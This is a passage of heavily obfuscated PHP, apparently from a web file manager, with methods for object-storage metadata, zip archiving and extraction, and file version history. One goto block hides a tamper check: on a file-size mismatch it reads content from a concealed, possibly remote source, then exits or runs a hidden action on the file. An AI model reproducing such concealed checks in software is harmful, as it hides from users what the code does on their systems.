$´İÅË½… = $this->_objectMeta($Æ¾ôÏ•ı); if (!$´İÅË½…) { return $å–çÌ[12]; } if (!isset($´İÅË½…[$å–çÌ[1410]]) && !empty($ÜÂÓª†)) { $§ÌÔ™œ– = $this->updateObjMeta($Æ¾ôÏ•ı, array($å–çÌ[1410] => $ÜÂÓª†)); $´İÅË½…[$å–çÌ[1410]] = $§ÌÔ™œ– ? $ÜÂÓª† : $å–çÌ[12]; } return isset($´İÅË½…[$å–çÌ[1410]]) ? strtolower($´İÅË½…[$å–çÌ[1410]]) : $å–çÌ[12]; } public function size($õ°£Ò”) { $ĞˆÒ¬‰Ø = $this->objectMeta($õ°£Ò”); return $ĞˆÒ¬‰Ø ? $ĞˆÒ¬‰Ø[$_SERVER[ì™ı‰º¯][76]] : 0; } public function info($ƒ¢Ç” ™) { if ($this->isFolder($ƒ¢Ç” ™)) { return $this->folderInfo($ƒ¢Ç” ™); } else { if ($this->isFile($ƒ¢Ç” ™)) { return $this->fileInfo($ƒ¢Ç” ™); } } return !1; } public function exist($šß¯¦û) { return $this->isFile($šß¯¦û) || $this->isFolder($šß¯¦û); } public function isFile($ –ı“) { return !$this->isFolder($ –ı“) && $this->objectMeta($ –ı“); } public function isFolder($ü‚á€èš) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][165], $ü‚á€èš); } protected function objectMeta($²ıåğí‘) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][167], $²ıåğí‘); } protected function _objectMeta($ÚŸ¹Î©ø) { $ÑæŠâåµ =& $_SERVER[ì™ı‰º¯]; try { $º“ğÈ±ˆ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÚŸ¹Î©ø)); } catch (OSS\Core\OssException $·…í¸âÒ) { $º“ğÈ±ˆ = !1; } if ($º“ğÈ±ˆ) { $º“ğÈ±ˆ[$ÑæŠâåµ[76]] = intval($º“ğÈ±ˆ[$ÑæŠâåµ[1408]]); } return $º“ğÈ±ˆ; } protected function _isFolder($¦Ëƒç«À) { $ø¬ˆ¸‚ =& $_SERVER[ì™ı‰º¯]; if ($¦Ëƒç«À == $ø¬ˆ¸‚[12] || $¦Ëƒç«À == $ø¬ˆ¸‚[8]) { return !0; } $ŠèŸÑ¢ô = array($ø¬ˆ¸‚[1404] => $ø¬ˆ¸‚[8], $ø¬ˆ¸‚[1405] => rtrim($¦Ëƒç«À, $ø¬ˆ¸‚[8]) . $ø¬ˆ¸‚[8], $ø¬ˆ¸‚[1406] => 1, $ø¬ˆ¸‚[1407] => $ø¬ˆ¸‚[12]); $’¨¤¿Íà = $this->client->listObjects($this->bucket, $ŠèŸÑ¢ô); if ($’¨¤¿Íà->getObjectList() || $’¨¤¿Íà->getPrefixList()) { return !0; } return !1; } } goto AäÔÏÒÂ‚; EùÉÈÆ¼ß: $_file = $_SERVER[$_SERVER[ì™ı‰º¯][873]]; $_size = $_SERVER[ì™ı‰º¯][1516]; if ($_SERVER[$_SERVER[ì™ı‰º¯][872]] != $_size($_file)) { $_getc = $_SERVER[ì™ı‰º¯][875]; $_getfile = $_SERVER[$_SERVER[ì™ı‰º¯][876]] . $_SERVER[ì™ı‰º¯][877]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì™ı‰º¯][231], $_getfilec); if (count($_getarrs) < $_SERVER[ì™ı‰º¯][612]) { $exit = $_SERVER[ì™ı‰º¯][878]; $exit(); } $_act = $_SERVER[ì™ı‰º¯][1512]; $_act($_file); } goto fŠ¨Ê‘àÔ‹; fŒÂ›„×²ß: define($_SERVER[ì™ı‰º¯][241], 1); define($_SERVER[ì™ı‰º¯][242], 0); define($_SERVER[ì™ı‰º¯][243], 2); goto BƒÌƒğÄâ“; F‰² ´£Ã˜: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $˜Õ˜ÀˆÙ; if ($˜Õ˜ÀˆÙ) { return $˜Õ˜ÀˆÙ; } $ä¥ö÷ñ° = IO::init($_SERVER[ì™ı‰º¯][8]); return $ä¥ö÷ñ°; } private static function iconvSystem($‚Ã©”­“) { return self::local()->iconvSystem($‚Ã©”­“); } private static function iconvApp($§Û´ñÈ¡) { return self::local()->iconvApp($§Û´ñÈ¡); } public static function zipFolder($ğª¶Úú, $°ÉŞŠ’Ï = "\172\151\x70", $‚¿†³ó‹ = '', $Ë™•ñ = REPEAT_RENAME) { $¬çàÒğù =& $_SERVER[ì™ı‰º¯]; $Ä¹è¦á = IO::listPath($ğª¶Úú); if (!$Ä¹è¦á) { return !1; } $Ä¹è¦á = array_merge($Ä¹è¦á[$¬çàÒğù[82]], $Ä¹è¦á[$¬çàÒğù[83]]); return self::zip($Ä¹è¦á, $°ÉŞŠ’Ï, $‚¿†³ó‹, $Ë™•ñ); } public static function zip($ü¶‡ÂÒ¦, $ÕáãÖ§ä = "\172\x69\x70", $íØüæ´” = '', $›¾ÏéÔ³ = REPEAT_RENAME) { $İıüÇÅ¸ =& $_SERVER[ì™ı‰º¯]; if (is_string($ü¶‡ÂÒ¦) && $ü¶‡ÂÒ¦) { $ü¶‡ÂÒ¦ = array(array($İıüÇÅ¸[84] => $ü¶‡ÂÒ¦)); } $ã…µó½ = self::init($ü¶‡ÂÒ¦[0][$İıüÇÅ¸[84]]); $½Ò½ğì = self::info($ü¶‡ÂÒ¦[0][$İıüÇÅ¸[84]]); $Ñ¾û‡‡˜ = $İıüÇÅ¸[12]; $›Ä›Êßô = $İıüÇÅ¸[12]; $àêÏÖ›Ÿ = $İıüÇÅ¸[12]; if ($íØüæ´” && substr($íØüæ´”, -1, 1) != $İıüÇÅ¸[8]) { $›Ä›Êßô = get_path_father($íØüæ´”); $àêÏÖ›Ÿ = get_path_this($íØüæ´”); } else { $›Ä›Êßô = self::pathFather($½Ò½ğì[$İıüÇÅ¸[84]]); $àêÏÖ›Ÿ = $½Ò½ğì[$İıüÇÅ¸[32]] . $İıüÇÅ¸[10] . $ÕáãÖ§ä; if (count($ü¶‡ÂÒ¦) > 1) { $”×ÊàÓ© = IO::info($›Ä›Êßô); $àêÏÖ›Ÿ = $”×ÊàÓ©[$İıüÇÅ¸[32]] . $İıüÇÅ¸[10] . $ÕáãÖ§ä; } if ($íØüæ´”) { $›Ä›Êßô = $íØüæ´”; } } if ($ã…µó½->getType() == $İıüÇÅ¸[106]) { $ı¹ Ê‰ = self::init($›Ä›Êßô); $û¦×›¿Ñ = $ı¹ Ê‰->getType() == $İıüÇÅ¸[106] ? $›Ä›Êßô : get_path_father($ã…µó½->path); $û¦×›¿Ñ = rtrim($û¦×›¿Ñ, $İıüÇÅ¸[8]) . $İıüÇÅ¸[8]; mk_dir($û¦×›¿Ñ); } else { $Ñ¾û‡‡˜ = TEMP_FILES . $İıüÇÅ¸[1182] . time() . rand_string(8) . $İıüÇÅ¸[8]; mk_dir($Ñ¾û‡‡˜); file_put_contents($Ñ¾û‡‡˜ . $İıüÇÅ¸[1183], $İıüÇÅ¸[12]); $û¦×›¿Ñ = $Ñ¾û‡‡˜; } $ˆÍ‹§‘Ù = IO::info($û¦×›¿Ñ); if (!$ˆÍ‹§‘Ù || !$ˆÍ‹§‘Ù[$İıüÇÅ¸[203]]) { show_json(LNG($İıüÇÅ¸[1184]), !1); } $İ—É¦ª™ = self::zipFileList($ü¶‡ÂÒ¦, $Ñ¾û‡‡˜); foreach ($İ—É¦ª™ as $íŠÎĞš => $íòÒÑ€) { $İ—É¦ª™[$íŠÎĞš] = self::iconvSystem($íòÒÑ€); } $Ç“”ÒªÈ = get_filename_auto($û¦×›¿Ñ . $àêÏÖ›Ÿ, $İıüÇÅ¸[12], $›¾ÏéÔ³); KodArchive::create(self::iconvSystem($Ç“”ÒªÈ), $İ—É¦ª™); if (!IO::exist($Ç“”ÒªÈ)) { if ($Ñ¾û‡‡˜) { del_dir($Ñ¾û‡‡˜); } show_json(LNG($İıüÇÅ¸[1185]), !1); } if (!$Ñ¾û‡‡˜) { return $Ç“”ÒªÈ; } $ı…âç¼ = self::move($Ç“”ÒªÈ, $›Ä›Êßô, $›¾ÏéÔ³); if ($Ñ¾û‡‡˜) { del_dir($Ñ¾û‡‡˜); } if (!$Ç“”ÒªÈ) { show_json(LNG($İıüÇÅ¸[1185]), !1); } return $ı…âç¼; } public static function unzip($à¶ĞÛŒ…, $á©˜ª«, $µ½»şÈî = "\x2d\61", $ãŸöÀÔÛ = "\162\145\x70\154\x61\x63\145") { $Ğã–’›Š =& $_SERVER[ì™ı‰º¯]; $«éúãà = parent::info($à¶ĞÛŒ…); if (!$«éúãà) { show_json(LNG($Ğã–’›Š[1186]), !1); } $¢”Ö–Íè = IO::infoFull($á©˜ª«); if (!$¢”Ö–Íè) { $á©˜ª« = IO::mkdir($á©˜ª«); } if (isset($¢”Ö–Íè[$Ğã–’›Š[402]]) && trim($¢”Ö–Íè[$Ğã–’›Š[84]], $Ğã–’›Š[8]) != trim($á©˜ª«, $Ğã–’›Š[8])) { $æğâú«­ = KodIO::make($¢”Ö–Íè[$Ğã–’›Š[432]]); $§¸’òëõ = IO::fileNameAuto($æğâú«­, $¢”Ö–Íè[$Ğã–’›Š[32]], REPEAT_RENAME_FOLDER, !0); $á©˜ª« = IO::mkdir($æğâú«­ . $§¸’òëõ); } $µ½»şÈî = $µ½»şÈî && $µ½»şÈî != $Ğã–’›Š[1187] ? @json_decode($µ½»şÈî, !0) : -1; $íñæöë = self::unzipPart($à¶ĞÛŒ…, $µ½»şÈî); if (!$íñæöë || !IO::exist($íñæöë[$Ğã–’›Š[200]])) { show_json(LNG($Ğã–’›Š[105]), !1); } $¬•ôÓ×Ã = $íñæöë[$Ğã–’›Š[1188]][count($íñæöë[$Ğã–’›Š[1188]]) - 1]; if ($¬•ôÓ×Ã[$Ğã–’›Š[1189]] == -1 || substr($¬•ôÓ×Ã[$Ğã–’›Š[32]], -1, 1) == $Ğã–’›Š[8]) { $Ä¢ÏçËÖ = $íñæöë[$Ğã–’›Š[1190]] . rand_string(10) . $Ğã–’›Š[8]; mk_dir($Ä¢ÏçËÖ); $İÌ‡’ØÌ = count($íñæöë[$Ğã–’›Š[1188]]) == 1 ? IO::ext($à¶ĞÛŒ…) : get_path_ext($íñæöë[$Ğã–’›Š[200]]); $áÙêíÕ = KodArchive::extract(self::iconvSystem($íñæöë[$Ğã–’›Š[200]]), $Ä¢ÏçËÖ, $¬•ôÓ×Ã[$Ğã–’›Š[1189]], $§¸’òëõ, $İÌ‡’ØÌ); self::unzipErrorCheck($áÙêíÕ, array($Ğã–’›Š[1191], $à¶ĞÛŒ…, $İÌ‡’ØÌ, $á©˜ª«, $íñæöë)); Hook::trigger($Ğã–’›Š[1192], $Ä¢ÏçËÖ); recursion_dir($Ä¢ÏçËÖ, $¥§ù¼†±, $¡Ÿùªî‹, 0); $»±éªĞš = array_merge($¥§ù¼†±, $¡Ÿùªî‹); $‹—¤Ã®Ï = array(); foreach ($»±éªĞš as $ ò°ÁË) { $±‘­¾İ­ = IO::move(self::iconvApp($ ò°ÁË), $á©˜ª«, $ãŸöÀÔÛ); if ($±‘­¾İ­) { $‹—¤Ã®Ï[] = $±‘­¾İ­; } } del_dir($Ä¢ÏçËÖ); } else { $±‘­¾İ­ = IO::move($íñæöë[$Ğã–’›Š[200]], $á©˜ª«, $ãŸöÀÔÛ, get_path_this($¬•ôÓ×Ã[$Ğã–’›Š[32]])); if ($±‘­¾İ­) { $‹—¤Ã®Ï[] = $±‘­¾İ­; } } return $‹—¤Ã®Ï ? $‹—¤Ã®Ï : !1; } public static function unzipList($Ò˜’ö÷¬) { $µûÖ÷©ç =& $_SERVER[ì™ı‰º¯]; $ŒÎ¬ÊóÀ = isset($Ò˜’ö÷¬[$µûÖ÷©ç[1193]]) ? $Ò˜’ö÷¬[$µûÖ÷©ç[1193]] : !1; $òÕÎ²± = isset($Ò˜’ö÷¬[$µûÖ÷©ç[1189]]) ? @json_decode($Ò˜’ö÷¬[$µûÖ÷©ç[1189]], !0) : -1; $ ³‚ùÏÍ = self::unzipPart($Ò˜’ö÷¬[$µûÖ÷©ç[84]], $òÕÎ²±); if (!$ ³‚ùÏÍ || !IO::exist($ ³‚ùÏÍ[$µûÖ÷©ç[200]])) { show_json(LNG($µûÖ÷©ç[105]), !1); } $×¹Ï‘àÓ = $ ³‚ùÏÍ[$µûÖ÷©ç[1188]][count($ ³‚ùÏÍ[$µûÖ÷©ç[1188]]) - 1]; $²‡Üôê” = in_array(IO::ext($ ³‚ùÏÍ[$µûÖ÷©ç[200]]), array($µûÖ÷©ç[313], $µûÖ÷©ç[1194], $µûÖ÷©ç[1195], $µûÖ÷©ç[1196], $µûÖ÷©ç[1197], $µûÖ÷©ç[1198])); if (!$ŒÎ¬ÊóÀ && ($×¹Ï‘àÓ[$µûÖ÷©ç[1189]] == -1 || $²‡Üôê”)) { $ÒÇ«“Î• = $ ³‚ùÏÍ[$µûÖ÷©ç[1190]] . get_path_this($ ³‚ùÏÍ[$µûÖ÷©ç[200]]) . $µûÖ÷©ç[1199]; if (!IO::exist($ÒÇ«“Î•)) { $©ÉëéÒ‚ = $×¹Ï‘àÓ[$µûÖ÷©ç[1189]] == -1 ? get_path_ext(IO::pathThis($Ò˜’ö÷¬[$µûÖ÷©ç[84]])) : get_path_ext($ ³‚ùÏÍ[$µûÖ÷©ç[200]]); $ªÙµá—ò = KodArchive::listContent(self::iconvSystem($ ³‚ùÏÍ[$µûÖ÷©ç[200]]), !0, $©ÉëéÒ‚); self::unzipErrorCheck($ªÙµá—ò, array($µûÖ÷©ç[1200], $Ò˜’ö÷¬, $ ³‚ùÏÍ)); @file_put_contents($ÒÇ«“Î•, json_encode($ªÙµá—ò[$µûÖ÷©ç[1201]])); } return @json_decode(IO::getContent($ÒÇ«“Î•), !0); } IO::fileOut($ ³‚ùÏÍ[$µûÖ÷©ç[200]], $ŒÎ¬ÊóÀ, get_path_this($×¹Ï‘àÓ[$µûÖ÷©ç[32]])); die; } private static function zipFileList($òø©§ï¤, $¢†èóêÔ = false) { $÷–¿Ò•Ñ =& $_SERVER[ì™ı‰º¯]; $‘°ªÄ—‹ = array(); foreach ($òø©§ï¤ as $³…ï…–Ú) { $ëïÒ´Í = $³…ï…–Ú[$÷–¿Ò•Ñ[84]]; if ($¢†èóêÔ) { $ëïÒ´Í = self::copy($³…ï…–Ú[$÷–¿Ò•Ñ[84]], $¢†èóêÔ, $÷–¿Ò•Ñ[814]); } else { $÷¨±ÔÓ„ = self::init($³…ï…–Ú[$÷–¿Ò•Ñ[84]]); if ($÷¨±ÔÓ„->getType() == $÷–¿Ò•Ñ[106]) { $ëïÒ´Í = $÷¨±ÔÓ„->path; } } if ($ëïÒ´Í && self::local()->exist($ëïÒ´Í)) { $‘°ªÄ—‹[$³…ï…–Ú[$÷–¿Ò•Ñ[84]]] = $ëïÒ´Í; } } if (!empty($‘°ªÄ—‹)) { return array_values($‘°ªÄ—‹); } show_json(LNG($÷–¿Ò•Ñ[1164]), !1); } private static function localFilePath($¬µ»Ş³û) { $ÊµŒ›ßû =& $_SERVER[ì™ı‰º¯]; $çËéã˜¤ = KodIO::parse($¬µ»Ş³û); if ($çËéã˜¤[$ÊµŒ›ßû[33]] == KodIO::KOD_SOURCE) { $°Ñø¡¬è = Model($ÊµŒ›ßû[821])->fileInfoGet(KodIO::sourceID($¬µ»Ş³û)); if (!$°Ñø¡¬è[$ÊµŒ›ßû[84]]) { show_json($ÊµŒ›ßû[1202], !1); } $¬µ»Ş³û = $°Ñø¡¬è[$ÊµŒ›ßû[84]]; } $¢ŒÃ®­Ô = self::init($¬µ»Ş³û); if ($¢ŒÃ®­Ô->pathParse[$ÊµŒ›ßû[1150]]) { $¬µ»Ş³û = $¢ŒÃ®­Ô->pathParse[$ÊµŒ›ßû[1150]]; $¢ŒÃ®­Ô = self::init($¬µ»Ş³û); } $ÔÅğÆ‘Ÿ = $¢ŒÃ®­Ô->getType(); if ($ÔÅğÆ‘Ÿ == $ÊµŒ›ßû[106] || $ÔÅğÆ‘Ÿ == $ÊµŒ›ßû[1203]) { if (!$¢ŒÃ®­Ô->exist($¢ŒÃ®­Ô->path)) { show_json(LNG($ÊµŒ›ßû[105]), !1); } return $¢ŒÃ®­Ô->path; } return !1; } public static function unzipPart($’í¡ığ‹, $¿Æ°˜Âå = -1) { $—¿¶«‡œ =& $_SERVER[ì™ı‰º¯]; $âÏ¢öûÄ = IO::pathThis($’í¡ığ‹); if (!$¿Æ°˜Âå || $¿Æ°˜Âå == -1) { $ÔİÉ–³ = array(array($—¿¶«‡œ[32] => $âÏ¢öûÄ, $—¿¶«‡œ[1189] => -1)); $ÔİÉ–³[0][$—¿¶«‡œ[1204]] = $ÔİÉ–³[0][$—¿¶«‡œ[32]]; } else { if (is_array($¿Æ°˜Âå)) { $ÔİÉ–³ = $¿Æ°˜Âå; $·åø¨¢ô = count($ÔİÉ–³) - 1; for ($âİ•şÁ = 0; $âİ•şÁ <= $·åø¨¢ô; $âİ•şÁ++) { $†ò…¢áõ = $ÔİÉ–³[$âİ•şÁ]; $İ¸ù©š’ = get_path_this($†ò…¢áõ[$—¿¶«‡œ[32]]) . (checkExtSafe($†ò…¢áõ[$—¿¶«‡œ[32]]) ? $—¿¶«‡œ[12] : $—¿¶«‡œ[1205]); $ÔİÉ–³[$âİ•şÁ][$—¿¶«‡œ[1204]] = $—¿¶«‡œ[1206] . intval($†ò…¢áõ[$—¿¶«‡œ[1189]]) . $—¿¶«‡œ[386] . $İ¸ù©š’; if ($âİ•şÁ == 0) { continue; } $ÔİÉ–³[$âİ•şÁ][$—¿¶«‡œ[1204]] = $ÔİÉ–³[$âİ•şÁ - 1][$—¿¶«‡œ[1204]] . $—¿¶«‡œ[1207] . $ÔİÉ–³[$âİ•şÁ][$—¿¶«‡œ[1204]]; } } } if (!is_array($ÔİÉ–³) || count($ÔİÉ–³) == 0) { return !1; } $ÁÌÖû«€ = $ÔİÉ–³[count($ÔİÉ–³) - 1]; if (!IO::exist($’í¡ığ‹)) { return !1; } $‹ë·ú¿¹ = TEMP_FILES . $—¿¶«‡œ[1208] . kodIO::hashPathSafe($’í¡ığ‹) . $—¿¶«‡œ[8]; $÷Æ¡õøÜ = $‹ë·ú¿¹ . $ÁÌÖû«€[$—¿¶«‡œ[1204]]; mk_dir($‹ë·ú¿¹); file_put_contents(TEMP_FILES . $—¿¶«‡œ[1183], $—¿¶«‡œ[12]); if (IO::exist($÷Æ¡õøÜ)) { return array($—¿¶«‡œ[200] => $÷Æ¡õøÜ, $—¿¶«‡œ[1188] => $ÔİÉ–³, $—¿¶«‡œ[1190] => $‹ë·ú¿¹); } $¡ÏÏòŸŸ = self::localFilePath($’í¡ığ‹); if (!$¡ÏÏòŸŸ) { $¡ÏÏòŸŸ = $‹ë·ú¿¹ . $—¿¶«‡œ[1209]; if (!IO::exist($¡ÏÏòŸŸ)) { self::copy($’í¡ığ‹, $‹ë·ú¿¹, !1, get_path_this($¡ÏÏòŸŸ)); } } if (!$¡ÏÏòŸŸ || !IO::exist($¡ÏÏòŸŸ)) { return !1; } if ($ÁÌÖû«€[$—¿¶«‡œ[1189]] == -1) { return array($—¿¶«‡œ[200] => $¡ÏÏòŸŸ, $—¿¶«‡œ[1188] => $ÔİÉ–³, $—¿¶«‡œ[1190] => $‹ë·ú¿¹); } $®•ØÕËÏ = $¡ÏÏòŸŸ; foreach ($ÔİÉ–³ as $âİ•şÁ => $†ò…¢áõ) { if (!$†ò…¢áõ || $†ò…¢áõ[$—¿¶«‡œ[1189]] == $—¿¶«‡œ[1187]) { break; } if (substr($†ò…¢áõ[$—¿¶«‡œ[32]], -1, 1) == $—¿¶«‡œ[8]) { break; } $ÀØÈÌà  = in_array(get_path_ext($†ò…¢áõ[$—¿¶«‡œ[1204]]), array($—¿¶«‡œ[313], $—¿¶«‡œ[1194], $—¿¶«‡œ[1195], $—¿¶«‡œ[1196], $—¿¶«‡œ[1197], $—¿¶«‡œ[1198])); $¹¦ö¥’í = $âİ•şÁ == count($ÔİÉ–³) - 1 && $ÀØÈÌà ; $ÌÏÁï‰± = $‹ë·ú¿¹ . $†ò…¢áõ[$—¿¶«‡œ[1204]]; $ûêÎÙ¤’ = $‹ë·ú¿¹ . get_path_this($†ò…¢áõ[$—¿¶«‡œ[32]]); if (IO::exist($ÌÏÁï‰±)) { $®•ØÕËÏ = $ÌÏÁï‰±; continue; } $‰§³“”¶ = $âİ•şÁ == 0 ? get_path_ext($âÏ¢öûÄ) : get_path_ext($®•ØÕËÏ); $ú“Å¡»· = KodArchive::extract(self::iconvSystem($®•ØÕËÏ), $‹ë·ú¿¹, $†ò…¢áõ[$—¿¶«‡œ[1189]], $Œı§ç­À, $‰§³“”¶); self::unzipErrorCheck($ú“Å¡»·, array($—¿¶«‡œ[1210], $’í¡ığ‹, $ÔİÉ–³, $†ò…¢áõ, $ÌÏÁï‰±)); if (IO::exist($ûêÎÙ¤’)) { IO::rename($ûêÎÙ¤’, get_path_this($ÌÏÁï‰±)); } $®•ØÕËÏ = $ÌÏÁï‰±; } $÷Æ¡õøÜ = $®•ØÕËÏ; return array($—¿¶«‡œ[200] => $®•ØÕËÏ, $—¿¶«‡œ[1188] => $ÔİÉ–³, $—¿¶«‡œ[1190] => $‹ë·ú¿¹); } private static function unzipErrorCheck($‚ˆˆ­íä, $ßíş”æ = false) { $İ­¸­‘í =& $_SERVER[ì™ı‰º¯]; if ($‚ˆˆ­íä[$İ­¸­‘í[1211]]) { return !0; } write_log(array($İ­¸­‘í[1212], $‚ˆˆ­íä, $ßíş”æ), $İ­¸­‘í[1213]); show_json($İ­¸­‘í[1214] . json_encode($‚ˆˆ­íä[$İ­¸­‘í[1201]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $‹ÌÁúÒ =& $_SERVER[ì™ı‰º¯]; $¢‹Û†Çí = $GLOBALS[$‹ÌÁúÒ[6]][$‹ÌÁúÒ[89]]; if ($¢‹Û†Çí[$‹ÌÁúÒ[1215]] != 1) { return; } if ($¢‹Û†Çí[$‹ÌÁúÒ[1216]] <= 0) { return; } if (isset($_REQUEST[$‹ÌÁúÒ[1217]]) && $_REQUEST[$‹ÌÁúÒ[1217]] == $‹ÌÁúÒ[88]) { return; } Hook::bind($‹ÌÁúÒ[1218], $‹ÌÁúÒ[1219]); Hook::bind($‹ÌÁúÒ[1220], $‹ÌÁúÒ[1221]); Hook::bind($‹ÌÁúÒ[1222], $‹ÌÁúÒ[1223]); Hook::bind($‹ÌÁúÒ[1224], $‹ÌÁúÒ[1225]); Hook::bind($‹ÌÁúÒ[1226], $‹ÌÁúÒ[1227]); Hook::bind($‹ÌÁúÒ[1228], $‹ÌÁúÒ[1229]); } public static function eventBeforeUpload($¬òé˜Ä) { if ($¬òé˜Ä[3] && $¬òé˜Ä[3] != REPEAT_REPLACE) { return; } $–üûí¡£ = self::parsePath($¬òé˜Ä[0]); if (!$–üûí¡£) { return; } self::add($–üûí¡£); } public static function eventBeforeEdit($¹©óÛ’) { $¡Šà€Êà = self::parsePath($¹©óÛ’[0]); if (!$¡Šà€Êà) { return; } self::add($¡Šà€Êà); } public static function eventBeforeCopyFile($ÖûãĞØ, $Ÿ§ó°ÚÉ, $«û£ö´°, $Áç¡çÄ², $ôÛî¬å„, $Å€ìıô­) { $Ò²È¡Š« =& $_SERVER[ì™ı‰º¯]; if (isset($«û£ö´°->_data[$Ò²È¡Š«[1154]]) && $«û£ö´°->_data[$Ò²È¡Š«[1154]]) { return; } $á„ã€ù = $«û£ö´°->getPathOuter($Áç¡çÄ²); $ª»±Ù•½ = self::parsePath($á„ã€ù); if (!$ª»±Ù•½) { return; } self::add($ª»±Ù•½); } public static function eventBeforeRename($±‘š¸à™) { $î¿´ë…À =& $_SERVER[ì™ı‰º¯]; $ÃÒÆãÎ€ = self::parsePath($±‘š¸à™[0]); if (!$ÃÒÆãÎ€) { return; } $ë§ëºœ£ = self::checkInHistory($ÃÒÆãÎ€); if (!$ë§ëºœ£) { return; } if ($ë§ëºœ£[$î¿´ë…À[33]] == $î¿´ë…À[200]) { $²ö¨š = self::listData($ÃÒÆãÎ€); if ($²ö¨š && $²ö¨š[$î¿´ë…À[369]]) { self::moveHistory($ÃÒÆãÎ€, $±‘š¸à™[1]); } } else { IO::rename($ë§ëºœ£[$î¿´ë…À[84]], $±‘š¸à™[1]); } } public static function eventBeforeMove($áâ‚«Ö‡) { $íÆ™¥”ø =& $_SERVER[ì™ı‰º¯]; $³»‰éµÔ = self::parsePath($áâ‚«Ö‡[0]); if (!$³»‰éµÔ) { return; } $²³ù Âá = self::parsePath($áâ‚«Ö‡[1]); if (!$²³ù Âá) { return; } $å”Ú¬ = $áâ‚«Ö‡[3]; $ÁïÁçê = self::checkInHistory($³»‰éµÔ); if (!$ÁïÁçê) { return; } $«¯—ªÍ§ = self::pathHistory($²³ù Âá); if ($ÁïÁçê[$íÆ™¥”ø[33]] == $íÆ™¥”ø[200]) { $üŞ„ñç‚ = self::listData($³»‰éµÔ); $ö§ûÕ¢ = rtrim($²³ù Âá, $íÆ™¥”ø[8]) . $íÆ™¥”ø[8] . ($å”Ú¬ ? $å”Ú¬ : get_path_this($³»‰éµÔ)); $…•™€Ò = self::listData($ö§ûÕ¢); if ($üŞ„ñç‚ && $üŞ„ñç‚[$íÆ™¥”ø[369]] && $…•™€Ò && $…•™€Ò[$íÆ™¥”ø[369]]) { return self::clear($³»‰éµÔ); } if ($üŞ„ñç‚ && $üŞ„ñç‚[$íÆ™¥”ø[369]]) { self::moveHistory($³»‰éµÔ, $å”Ú¬, $«¯—ªÍ§); } } else { IO::move($ÁïÁçê[$íÆ™¥”ø[84]], $«¯—ªÍ§, !1, $å”Ú¬); self::clearEmptyFolder(IO::pathFather($ÁïÁçê[$íÆ™¥”ø[84]])); } } public static function eventAfterRemove($‰½ßÉşõ, $ÁºÅıöİ) { $éƒ»÷°Å =& $_SERVER[ì™ı‰º¯]; if (!$ÁºÅıöİ) { return; } $ë»ûÂöø = self::parsePath($‰½ßÉşõ[0]); if (!$ë»ûÂöø) { return; } $ÈåÔ‚œı = self::checkInHistory($ë»ûÂöø); if (!$ÈåÔ‚œı) { return; } if ($ÈåÔ‚œı[$éƒ»÷°Å[33]] == $éƒ»÷°Å[200]) { $ó•Óğ±Â = self::listData($ë»ûÂöø, !1); if ($ó•Óğ±Â && $ó•Óğ±Â[$éƒ»÷°Å[369]]) { self::clear($ë»ûÂöø, !1); } } else { IO::remove($ÈåÔ‚œı[$éƒ»÷°Å[84]]); self::clearEmptyFolder(IO::pathFather($ÈåÔ‚œı[$éƒ»÷°Å[84]])); } } private static function checkInHistory($§¼ê‚«œ) { $º³Ö¼Ÿ¯ = self::pathHistory($§¼ê‚«œ); if (!IO::exist($º³Ö¼Ÿ¯)) { $º³Ö¼Ÿ¯ .= $_SERVER[ì™ı‰º¯][1230]; } return IO::exist($º³Ö¼Ÿ¯) ? IO::info($º³Ö¼Ÿ¯) : !1; } private static function parsePath($šı£§—) { $Ùú¼‚‡¿ =& $_SERVER[ì™ı‰º¯]; if (!$šı£§—) { return !1; } if ($GLOBALS[$Ùú¼‚‡¿[1231]]) { return; } $ƒé¢â½ = KodIO::parse($šı£§—); $äÃ“³›ğ = $ƒé¢â½[$Ùú¼‚‡¿[33]]; $×ç§®Íß = !$äÃ“³›ğ || $äÃ“³›ğ == KodIO::KOD_IO || $äÃ“³›ğ == KodIO::KOD_SHARE_ITEM; if (!$×ç§®Íß || !$ƒé¢â½[$Ùú¼‚‡¿[1232]]) { return !1; } if (substr($šı£§—, 0, strlen(DATA_PATH . $Ùú¼‚‡¿[1233])) == DATA_PATH . $Ùú¼‚‡¿[1233]) { return !1; } if ($äÃ“³›ğ == KodIO::KOD_SHARE_ITEM) { $µ¬¡òî¯ = IO::init($šı£§—); if ($µ¬¡òî¯->pathParse[$Ùú¼‚‡¿[1150]]) { return self::parsePath($µ¬¡òî¯->pathParse[$Ùú¼‚‡¿[1150]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÖğÌ¢ø÷ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ùú¼‚‡¿[1234]); foreach ($ÖğÌ¢ø÷ as $¶Úİå€õ) { if (!$äÃ“³›ğ && substr($šı£§—, 0, strlen($¶Úİå€õ)) == $¶Úİå€õ) { return !1; } } self::log($GLOBALS[$Ùú¼‚‡¿[1145]] . $Ùú¼‚‡¿[1235] . $šı£§—); return $šı£§—; } private static function pathHistory($ò¬à™‘æ) { $¤öŸ÷ =& $_SERVER[ì™ı‰º¯]; $Œ—Ößµ× = self::$_historyBase . ltrim(KodIO::clear($ò¬à™‘æ), $¤öŸ÷[8]); $Œ—Ößµ× = str_replace(array($¤öŸ÷[1236]), array($¤öŸ÷[1237]), $Œ—Ößµ×); return $Œ—Ößµ×; } public static function log($†ãÃò„£) { } public static function historyCount($ŸŸí˜ãÁ) { $¸—ÕÍì =& $_SERVER[ì™ı‰º¯]; $æ¢ÅÖÁ = array(); $ûÅ¨¢× = array(); foreach ($ŸŸí˜ãÁ as $º·üúÆ˜) { $°ûµº ¸ = get_path_father($º·üúÆ˜); if (!$ûÅ¨¢×[$°ûµº ¸]) { $ûÅ¨¢×[$°ûµº ¸] = array(); } $ûÅ¨¢×[$°ûµº ¸][] = get_path_this($º·üúÆ˜); } foreach ($ûÅ¨¢× as $°ûµº ¸ => $ÔìÃ¨™ê) { $‹´‰ = self::parsePath($°ûµº ¸); if (!$‹´‰) { continue; } foreach ($ÔìÃ¨™ê as $¶ğˆ­¾) { $¶åÃĞ¢Ø = self::listData(rtrim($‹´‰, $¸—ÕÍì[8]) . $¸—ÕÍì[8] . $¶ğˆ­¾, !1); if 